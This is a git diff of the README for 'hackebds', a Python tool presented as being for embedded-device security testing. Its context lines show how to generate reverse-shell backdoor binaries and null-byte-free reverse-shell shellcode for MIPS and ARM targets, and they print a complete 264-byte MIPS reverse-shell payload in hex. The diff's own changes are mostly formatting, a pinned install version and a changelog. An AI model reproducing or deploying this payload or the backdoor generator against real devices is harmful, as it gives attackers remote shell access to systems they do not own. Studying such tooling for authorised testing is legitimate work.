@@ -12,18 +12,16 @@ This tool is embedded in the security test of the device. There are two main fun
 
 2.  Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips are now supported, and they are still being updated**
 
-## install (1)  Highly recommended！！Because the source code compilation may not be updated in time
-**pip install hackebds**
+## install (1)  Highly recommended！！Because the source code compilation may not be updated in time，Please install the latest
+**pip install hackebds==0.0.6**
 ```
-pip install hackebds
+pip install hackebds==0.0.6
 ....
+```
 #### Instructions for use
-  
-  When importing this module will import the pwn module
+When importing this module will import the pwn module
 
 1. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
-#### 
-
 ```
 >>> from hackebds import *
 >>> mipsel_backdoor(reverse_ip,reverse_port)
@@ -41,7 +39,7 @@ mipsel_backdoor is ok in current path ./
 >>> 
 ```
 2. Generates the use-back shellcode (no free) null bytes corresponding to various architectures
-#### 
+
 ```
 >>> from hackebds import *
 >>> mipsel_reverse_sl(reverse_ip,reverse_port)
@@ -59,8 +57,6 @@ example:
 [+] No NULL byte shellcode for hex(len is 264):
 \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
 ```
-#### 
-
 ## install (2)
   python2 install pwn
 ```
@@ -124,6 +120,10 @@ Allwinner(全志)V3s
 
 Armv8:
 Qualcomm Snapdragon 660
+
+## updating
+ 2022.4.19 Added support for aarch64 null-byte reverse_shellcode
+ 2022.4.30 Reduced amount of code using functions
 
 ## One-click build environment
 
